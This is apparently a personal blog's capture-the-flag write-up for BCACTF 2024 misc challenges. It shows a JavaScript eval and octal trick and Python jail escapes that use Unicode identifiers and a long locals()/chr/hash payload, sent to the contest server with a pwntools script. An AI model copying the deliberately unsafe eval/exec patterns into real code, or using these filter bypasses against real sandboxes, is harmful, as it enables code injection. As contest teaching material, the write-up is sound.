---
layout: post
title: BCACTF 2024 | Misc-Writeups
date: 2024-06-12
tags: ['BCACTF_5.0']
math: True
---

# Misc/Miracle
## Challenge Description
You'll need a miracle to get this flag. The server requires you to solve an easy addition problem, but you only get the flag if the bits magically flip to form another answer.

## Resoruces
[main.js](./assets/scripts/misc/main.js)
```js
const readline = require("readline");
const fs = require("fs");

async function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// thanks chatgpt
function printWithoutNewline(text) {
  process.stdout.write(text);
}

function prompt(question) {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });

  return new Promise((resolve) => {
    rl.question(question, (answer) => {
      rl.close();
      resolve(answer);
    });
  });
}
//end thanks chatgpt

const flag = fs.readFileSync("flag.txt", "utf8");

async function run() {
  const name = await prompt("What is your name?\n") ?? "Harry";
  const ans = await prompt("What is 55+22?\n") ?? "0";
  if (eval("Number(ans)") === 77) {
    console.log("Correct!");
    console.log("Waiting for bits to flip...");
    for (let i = 0; i < 10; i++) {
      printWithoutNewline("...");
      await sleep(300);
    }
    console.log("\n");
    if (eval(ans) === 63) {
      console.log(`You made those bits flip?? You're a wizard ${name}! `);
      console.log(`Here's your flag: ${flag}`);
    } else {
        console.log("You didn't make the bits flip. Too bad ");
    }
  } else {
    console.log("wow you suck at math.");
  }
  process.exit(1);
}

run();
```
[eslint.config.mjs](./assets/scripts/misc/eslint.config.mjs)

```mjs
import globals from "globals";
import pluginJs from "@eslint/js";


export default [
  {files: ["**/*.js"], languageOptions: {sourceType: "commonjs"}},
  {languageOptions: { globals: globals.browser }},
  pluginJs.configs.recommended,
  {
    rules: {
        "no-unused-vars": "error",
        "no-octal": "error",
        "for-direction": "error",
        "getter-return": "error",
        "no-async-promise-executor": "error",
        "no-compare-neg-zero": "error",
        "no-cond-assign": "error",
        "no-constant-condition": "error",
        "no-control-regex": "error",
        "no-dupe-args": "error",
        "no-dupe-keys": "error",
        "no-duplicate-case": "error",
        "no-empty": "error",
        "no-empty-character-class": "error",
        "no-ex-assign": "error",
        "no-extra-boolean-cast": "error",
        "no-extra-semi": "error",
        "no-invalid-regexp": "error",
    }
  }
];
```

## Solution
```js
const ans = await prompt("What is 55+22?\n") ?? "0";
  if (eval("Number(ans)") === 77) {
    console.log("Correct!");
    console.log("Waiting for bits to flip...");
    for (let i = 0; i < 10; i++) {
      printWithoutNewline("...");
      await sleep(300);
    }
    console.log("\n");
    if (eval(ans) === 63) {
      console.log(`You made those bits flip?? You're a wizard ${name}! `);
      console.log(`Here's your flag: ${flag}`);
    } else {
        console.log("You didn't make the bits flip. Too bad ");
    }
  } else {
    console.log("wow you suck at math.");
  }
```
This is the main part of the challenge. We need to give some input such that `(eval("Number(ans)") === 77)` and `(eval(ans) === 63)`. So this either exploits some vulnerability of `Number()` or `eval()`. 

After going through their docs, I found something intersting about `Number()` in this [section](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number#number_coercion).

![alt text](./assets/images/misc-miracle/image.png)

**And `73 in octal(base 8) is 63 in decimal(base 10)`.** 

So for an input of `077`, **`eval("Number(077)") will ignore the 0, and thus return 77`** whereas **`eval(077) will consider 0 and treat 77 as octal(base 8), thus returning 63 in decimal(base 10)`**

```console
nc challs.bcactf.com 30105
What is your name?

What is 55+22?
077
Correct!
Waiting for bits to flip...
..............................

You made those bits flip?? You're a wizard ! 
Here's your flag: bcactf{j$_is_W3Ird_?rfuhie4923}
```



# Misc/Jailbreak 1
## Challenge Description
I cannot get the python file to print the flag, are you able to?

## Hint
How can you access variables in python?

## Resoruces

[deploy.py](./assets/scripts/misc/pyjail1/deploy.py)
```py
def sanitize(letter):
    print("Checking for contraband...")
    return any([i in letter.lower() for i in BANNED_CHARS])

BANNED_CHARS = "gdvxftundmnt'~`@#$%^&*-/.{}"
flag = open('flag.txt').read().strip()

print("Welcome to the prison's mail center")
msg = input("Please enter your message: ")

if sanitize(msg): 
    print("Contraband letters found!\nMessage Deleted!")
    exit()

exec(msg)
```
## Solution
**`UNINTENDED`**

Python actuall allows `italics` and since the script doesn't have any constrain on unicode, so `𝘱𝘳𝘪𝘯𝘵(𝘧𝘭𝘢𝘨)` will do the job.

```console
nc challs.bcactf.com 32087
Welcome to the prison's mail center
Please enter your message: 𝘱𝘳𝘪𝘯𝘵(𝘧𝘭𝘢𝘨)
Checking for contraband...
bcactf{PyTH0n_pR0_03ed78292b89c}

```

# Misc/Jailbreak 2
## Challenge Description
The prison has increased security measures since you last escaped it. Can you still manage to escape?

## Hint
What in python is evaluated to a number?

## Resoruces

[main.py](./assets/scripts/misc/main.py)
```py
def sanitize(letter):
    print("Checking for contraband...")
    return any([i in letter.lower() for i in BANNED_CHARS])

def end():
    print("Contraband letters found!\nMessages Deleted!")
    exit()

BANNED_CHARS = "gdvxfiyundmnet/\\'~`@#$%^&.{}0123456789"
flag = open('flag.txt').read().strip()

print("Welcome to the prison's mail center")

msg = input("\nPlease enter your message: ")

while msg != "":
    if sanitize(msg): 
        end()

    try:
        x = eval(msg)
        if len(x) != len(flag): end()
        print(x)
    except Exception as e:
        print(f'Error occured: {str(e)}; Message could not be sent.')

    msg = input("\nPlease enter your message: ")
```
## Solution
**`UNINTENDED`**

Again the same solution works as there is no constraint on unicode. `𝘧𝘭𝘢𝘨`

```console
nc challs.bcactf.com 30335
Welcome to the prison's mail center

Please enter your message: 𝘧𝘭𝘢𝘨
Checking for contraband...
bcactf{PyTH0n_M4st3R_Pr0veD}
```

# Misc/Jailbreak Revenge
## Challenge Description
Some of y'all cheesed the previous two jailbreaks, so it looks like they've put even more band-aids on the system...

## Hint
What in python is evaluated to a number?

## Resoruces


[main.py](./assets/scripts/misc/pyjail1/main.py)
```py
def sanitize(letter):
    print("Checking for contraband...")
    return any([(i in letter.lower()) for i in BANNED_CHARS]) or any([ord(l)>120 for l in letter])

def end():
    print("Contraband letters found!\nMessages Deleted!")
    exit()

BANNED_CHARS = "gdvxfiyundmpnetkb/\\'\"~`!@#$%^&*.{},:;=0123456789#-_|? \t\n\r\x0b\x0c"
flag = open('flag.txt').read().strip()

print("Welcome to the prison's mail center")

msg = input("\nPlease enter your message: ")

while msg != "":
    if sanitize(msg): 
        end()

    try:
        x = eval(msg)
        if len(x) != len(flag): end()
        print(x)
    except Exception as e:
        print(f'Error.')

    msg = input("\nPlease enter your message: ")
```
## Solution
This time the unicode is constrainted to 120, so our previous exploit won't work.

**Allowed characters:** achjloqrsw()[]+<>

`chr, hash, all, locals` can be made from these. `+` will allow concatination and `<>` allows boolean.

`(hash(all)>hash(chr))` will return 1

`((hash(all)>hash(chr))+(hash(all)>hash(chr)))` will return 2

Similarly we can make any number by `concatination`.

We can make flag like &rarr; `chr(102)+chr(108)+chr(99)+ch4(103)`.

`locals()` returns the dictionary of the current local symbol table. Symbol table is created by a compiler that is used to store all information needed to execute a program.

Thus, `locals()[flag]` will give us the flag.

## Solution Script 
Run this script 4-5 times to get the flag.

```python
from pwn import * 

p = remote("challs.bcactf.com", 30223)
# p = process(["python3", "main.py"])

data = open("payload.txt").read()
p.sendline(data)

p.interactive()
```

payload.txt
```txt
locals()[chr((hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr)))+chr((hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr)))+chr((hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr)))+chr((hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr))+(hash(all)>hash(chr)))]
```

## Flag
`bcactf{Wr1tING_pyJaiL5_iS_hArD_f56450aadefcc}`